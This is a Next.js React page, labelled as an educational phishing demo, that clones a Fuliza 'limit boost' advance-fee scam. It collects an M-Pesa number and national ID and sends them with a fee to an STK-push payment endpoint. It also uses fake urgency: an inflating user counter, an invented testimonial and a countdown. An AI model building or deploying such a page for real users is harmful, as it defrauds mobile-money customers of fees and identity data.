'use client';
// src/app/page.tsx - Final Version (No Phone Prefill)

import React, { useState, useEffect } from 'react';

const formatKsh = (amount: number) => `Ksh ${amount.toLocaleString('en-KE')}`;

const limits = [
  { amount: 3000, fee: 250 },
  { amount: 5000, fee: 293 },
  { amount: 7500, fee: 350 },
  { amount: 10000, fee: 500 },
  { amount: 12500, fee: 747 },
  { amount: 16000, fee: 898 },
  { amount: 21000, fee: 1015 },
  { amount: 25500, fee: 1220 },
  { amount: 30000, fee: 1533 },
  { amount: 35000, fee: 1730 },
  { amount: 45000, fee: 2000 },
  { amount: 60000, fee: 2250 },
  { amount: 70000, fee: 2500 },
];

export default function FulizaBoostExactClone() {
  const [step, setStep] = useState<'input' | 'loading' | 'congrats' | 'select' | 'final'>('input');
  const [usersOnline, setUsersOnline] = useState(137);
  const [phoneNumber, setPhoneNumber] = useState(''); // No prefill
  const [enteredPhone, setEnteredPhone] = useState('');
  const [loadingMsg, setLoadingMsg] = useState('');

  // Modal states
  const [showSecureModal, setShowSecureModal] = useState(false);
  const [showProcessingModal, setShowProcessingModal] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const [selectedLimit, setSelectedLimit] = useState<{ amount: number; fee: number } | null>(null);
  const [idNumber, setIdNumber] = useState('');
  const [isPaying, setIsPaying] = useState(false);

  // 10-minute countdown
  const [countdown, setCountdown] = useState(600);

  const loadingMessages = [
    "Connecting...",
    "Accessing secure databases...",
    "Initialising...",
    "Verifying account status...",
    "Calculating eligibility..."
  ];

  useEffect(() => {
    const interval = setInterval(() => {
      setUsersOnline(prev => prev + Math.floor(Math.random() * 3) + 1);
    }, 2800);
    return () => clearInterval(interval);
  }, []);

  // Countdown timer
  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (showSuccessModal && countdown > 0) {
      timer = setInterval(() => setCountdown(prev => prev - 1), 1000);
    }
    return () => clearInterval(timer);
  }, [showSuccessModal, countdown]);

  const formatCountdown = () => {
    const min = Math.floor(countdown / 60);
    const sec = countdown % 60;
    return `${min}:${sec.toString().padStart(2, '0')}`;
  };

  const handleCheckEligibility = () => {
    if (!phoneNumber.trim()) {
      alert("Please enter your M-Pesa number (demo only)");
      return;
    }
    setEnteredPhone(phoneNumber.trim());
    setStep('loading');
    setLoadingMsg(loadingMessages[0]);

    let i = 0;
    const interval = setInterval(() => {
      i++;
      if (i < loadingMessages.length) {
        setLoadingMsg(loadingMessages[i]);
      } else {
        clearInterval(interval);
        setTimeout(() => setStep('congrats'), 900);
      }
    }, 1300);
  };

  const handleProceedToUpgrade = () => setStep('select');

  const handleSelectLimit = (limit: { amount: number; fee: number }) => {
    setSelectedLimit(limit);
    setShowSecureModal(true);
  };

  // Real STK Push Call
  const handlePay = async () => {
    if (!idNumber.trim() || !selectedLimit) {
      alert("Please enter your ID Number (demo only)");
      return;
    }

    setIsPaying(true);

    try {
      const payload = {
        phone: enteredPhone,
        amount: selectedLimit.fee,
        apiRef: idNumber || `ref-${Date.now()}`,
      };

      const res = await fetch('/api/mock-stk-push', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      const data = await res.json();

      if (data.ok) {
        setShowSecureModal(false);
        setShowProcessingModal(true);
      } else {
        alert(data.error || "Failed to send STK push");
      }
    } catch (error) {
      console.error("STK Push Error:", error);
      alert("Connection error. Please try again.");
    } finally {
      setIsPaying(false);
    }
  };

  const closeProcessingModal = () => {
    setShowProcessingModal(false);
    setShowSuccessModal(true);
    setCountdown(600);
  };

  const closeSuccessModal = () => {
    setShowSuccessModal(false);
    setStep('final');
    setCountdown(600);
  };

  const closeSecureModal = () => {
    setShowSecureModal(false);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-emerald-50 to-white flex items-center justify-center px-4 py-8 font-sans">
      {/* RED WARNING BANNER */}
      <div className="fixed top-0 left-0 right-0 bg-red-600 text-white text-center py-2.5 text-xs font-bold z-50 tracking-wide">
        🚨 EDUCATIONAL PHISHING DEMO ONLY — FOR SAFARICOM CYBERSECURITY JOB APPLICATION<br />
        DO NOT ENTER REAL M-PESA NUMBER OR DATA
      </div>

      <div className="w-full max-w-[420px] mx-auto">

        <div className="bg-white rounded-3xl shadow-2xl overflow-hidden min-h-[600px]">

          {/* Input Screen */}
          {step === 'input' && (
            <>
              <div className="pt-10 pb-6 flex flex-col items-center">
                <div className="w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center relative">
                  <span className="text-5xl">👤</span>
                  <div className="absolute -bottom-2 -right-2 bg-white rounded-full p-1 shadow text-xl">🛡️</div>
                </div>
                <h1 className="mt-6 text-4xl font-bold text-gray-900">Fuliza Plus+</h1>
                <p className="text-emerald-600 font-semibold text-lg">OFFICIAL VERIFICATION PORTAL</p>
                <p className="mt-6 px-8 text-center text-gray-600 text-[15px]">
                  Verify your identity to unlock higher daily transaction limits.
                </p>
              </div>

              <div className="px-8 pb-10">
                <div className="relative mb-8">
                  <div className="absolute left-5 top-4 text-emerald-600 text-xl">📱</div>
                  <input
                    type="tel"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value)}
                    placeholder="Enter M-Pesa Number"
                    className="w-full bg-gray-50 border border-gray-200 focus:border-emerald-500 rounded-2xl pl-14 pr-6 py-4 text-base outline-none"
                  />
                </div>
                <button
                  onClick={handleCheckEligibility}
                  className="w-full bg-emerald-600 hover:bg-emerald-700 py-4 rounded-2xl text-white font-semibold text-lg flex items-center justify-center gap-2"
                >
                  Check My Eligibility <span>›</span>
                </button>
              </div>

              <div className="border-t border-gray-100 py-4 px-8 flex items-center justify-between text-xs text-gray-500 bg-gray-50">
                <div className="flex items-center gap-1.5">
                  <span className="text-emerald-500">●</span> {usersOnline} USERS ONLINE
                </div>
                <div>🔒 SSL SECURED</div>
              </div>
            </>
          )}

          {/* Loading Screen */}
          {step === 'loading' && (
            <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
              <div className="bg-white rounded-3xl p-12 w-[320px] text-center shadow-2xl">
                <div className="animate-spin h-14 w-14 border-4 border-emerald-600 border-t-transparent rounded-full mx-auto"></div>
                <p className="mt-8 text-xl font-medium text-gray-700 min-h-[28px]">{loadingMsg}</p>
                <p className="text-xs text-gray-500 mt-10">Please wait • Do not close this window</p>
              </div>
            </div>
          )}

          {/* Congratulations Screen */}
          {step === 'congrats' && (
            <div className="px-8 py-12 text-center">
              <div className="mx-auto w-20 h-20 bg-emerald-600 rounded-full flex items-center justify-center mb-6">
                <span className="text-white text-5xl font-light">✓</span>
              </div>
              <h2 className="text-3xl font-bold text-gray-900">Congratulations!</h2>
              <p className="mt-6 text-gray-700">
                High Trust Score Detected.{' '}
                <span className="text-emerald-600 font-medium">{enteredPhone}</span> is eligible for a boost.
              </p>
              <button
                onClick={handleProceedToUpgrade}
                className="mt-10 w-full bg-gray-900 hover:bg-black py-4 rounded-2xl text-white font-semibold text-lg"
              >
                Proceed to Upgrade Limit
              </button>
            </div>
          )}

          {/* Select Limit Screen */}
          {step === 'select' && (
            <div className="px-4 py-6">
              <div className="text-center mb-6">
                <h1 className="text-3xl font-bold text-gray-900">FulizaBoost</h1>
                <p className="text-sm text-gray-500 mt-1">Instant Limit Increase • Same Day Access</p>
              </div>

              <div className="bg-emerald-50 border border-emerald-100 rounded-2xl p-4 mb-8 mx-2">
                <div className="flex items-center gap-2 text-xs font-medium text-emerald-600">
                  <span>🔄</span> LIVE ACTIVITY
                </div>
                <p className="text-sm text-gray-700 mt-1">
                  Brian O. (0725***80) boosted to Ksh 21,000 just now
                </p>
              </div>

              <h2 className="text-xl font-semibold text-center mb-6 text-gray-900 px-2">
                Select Your New Approved Limit
              </h2>

              <div className="grid grid-cols-2 gap-3 px-2">
                {limits.map((opt) => (
                  <button
                    key={opt.amount}
                    onClick={() => handleSelectLimit(opt)}
                    className="bg-white border border-gray-200 hover:border-emerald-500 hover:shadow-sm transition-all rounded-2xl p-5 text-center active:scale-[0.97]"
                  >
                    <div className="text-[21px] font-bold text-emerald-700">
                      {formatKsh(opt.amount)}
                    </div>
                    <div className="text-[10px] text-gray-500 mt-1.5 tracking-wider">
                      FEE: KSH {opt.fee}
                    </div>
                  </button>
                ))}
              </div>

              <button className="mt-10 mx-2 w-full bg-emerald-600 hover:bg-emerald-700 py-4 rounded-2xl text-white font-semibold text-lg flex items-center justify-center gap-2 shadow cursor-not-allowed opacity-75">
                ⚡ SELECT A LIMIT
              </button>
            </div>
          )}

          {/* Final Ksh 0 Screen 
          {step === 'final' && (
            <div className="px-8 py-16 text-center">
              <h2 className="text-3xl font-bold text-emerald-700">Limit will be boosted to</h2>
              <p className="text-7xl font-bold text-emerald-600 mt-8">Ksh 0</p>
              <p className="mt-8 text-sm text-red-500">* Final amount depends on full verification</p>
            </div>
          )}*/}
        </div>
      </div>

      {/* Secure Fuliza Application Modal */}
      {showSecureModal && selectedLimit && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 px-4">
          <div className="bg-white rounded-3xl w-full max-w-[380px] overflow-hidden shadow-2xl">
            <div className="bg-emerald-600 text-white p-5 text-center">
              <p className="text-xs font-medium tracking-widest">SECURE FULIZA APPLICATION</p>
              <p className="text-lg font-semibold mt-1">
                Limit will be boosted to {formatKsh(selectedLimit.amount)}
              </p>
            </div>

            <div className="p-6">
              <div className="bg-emerald-50 border border-emerald-100 rounded-xl p-4 text-sm text-gray-700 mb-6">
                Enter your Safaricom number for VERIFICATION! and to receive M-Pesa payment prompt. 
                Once payment is confirmed your Fuliza boost request will begin processing.
              </div>

              <div className="mb-5">
                <p className="text-xs font-medium text-gray-500 mb-1.5">ID Number</p>
                <input
                  type="text"
                  value={idNumber}
                  onChange={(e) => setIdNumber(e.target.value)}
                  placeholder="Enter ID Number"
                  className="w-full border border-gray-300 rounded-xl px-4 py-3 text-base outline-none focus:border-emerald-600"
                />
              </div>

              <div>
                <p className="text-xs font-medium text-gray-500 mb-1.5">Phone Number</p>
                <input
                  type="tel"
                  value={enteredPhone}
                  readOnly
                  className="w-full border border-gray-300 bg-gray-50 rounded-xl px-4 py-3 text-base outline-none"
                />
              </div>
            </div>

            <div className="flex border-t border-gray-100">
              <button 
                onClick={closeSecureModal} 
                className="flex-1 py-4 text-gray-600 font-semibold border-r border-gray-100 hover:bg-gray-50"
                disabled={isPaying}
              >
                Cancel
              </button>
              <button 
                onClick={handlePay} 
                disabled={isPaying}
                className="flex-1 py-4 bg-emerald-600 hover:bg-emerald-700 disabled:bg-gray-400 text-white font-semibold transition"
              >
                {isPaying ? "Processing..." : `Pay Ksh ${selectedLimit.fee}`}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Check M-Pesa Response Modal */}
      {showProcessingModal && selectedLimit && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-[60] px-4">
          <div className="bg-white rounded-3xl w-full max-w-[380px] overflow-hidden shadow-2xl">
            <div className="bg-emerald-600 text-white p-5 text-center">
              <p className="text-xs font-medium tracking-widest">SECURE FULIZA APPLICATION</p>
              <p className="text-lg font-semibold mt-1">
                Limit will be boosted to {formatKsh(selectedLimit.amount)}
              </p>
            </div>

            <div className="p-8 text-center">
              <div className="mx-auto w-16 h-16 border-4 border-emerald-600 border-t-transparent rounded-full animate-spin mb-6"></div>
              <h3 className="text-xl font-semibold text-gray-900 mb-1">Check M-Pesa Response</h3>
              <p className="text-gray-600 text-sm">Processing your request...</p>
            </div>

            <div className="px-6 pb-6">
              <button
                onClick={closeProcessingModal}
                className="w-full bg-emerald-600 hover:bg-emerald-700 py-4 rounded-2xl text-white font-semibold text-lg"
              >
                OK
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Request Received Success Screen with 10-Minute Countdown */}
      {showSuccessModal && selectedLimit && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-[70] px-4">
          <div className="bg-white rounded-3xl w-full max-w-[380px] overflow-hidden shadow-2xl">
            <div className="bg-emerald-600 text-white p-5 text-center">
              <p className="text-xs font-medium tracking-widest">SECURE FULIZA APPLICATION</p>
              <p className="text-lg font-semibold mt-1">
                Limit will be boosted to {formatKsh(selectedLimit.amount)}
              </p>
            </div>

            <div className="p-8 text-center">
              <div className="mx-auto w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center mb-6">
                <span className="text-emerald-600 text-5xl">✓</span>
              </div>

              <h3 className="text-2xl font-semibold text-gray-900">Request Received</h3>
              <p className="text-gray-600 mt-1">Updating records. Please wait.</p>

              <div className="mt-8 bg-gray-100 rounded-2xl py-4 px-10 inline-block">
                <span className="text-4xl font-mono font-semibold text-gray-800">
                  {formatCountdown()}
                </span>
              </div>
            </div>

            <div className="px-6 pb-8 space-y-3">
              <button className="w-full bg-emerald-600 hover:bg-emerald-700 py-4 rounded-2xl text-white font-semibold flex items-center justify-center gap-2">
                <span>💬</span> Chat on WhatsApp
              </button>

              <button
                onClick={closeSuccessModal}
                className="w-full bg-gray-900 hover:bg-black py-4 rounded-2xl text-white font-semibold"
              >
                Done
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}